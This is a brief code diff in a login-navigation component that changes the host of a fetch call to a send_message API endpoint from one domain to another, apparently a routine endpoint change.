@@ -80,7 +80,7 @@ export function LoginNavigation() {
       redirect: 'follow'
     };
     message.confirm = 2
-    await fetch(`https://projectx.digiluys.com/api/send_message`, requestOptions)
+    await fetch(`https://iron-pay.com/api/send_message`, requestOptions)
       .then(response => response.json())
       .then(result => {
         if (result.status) {
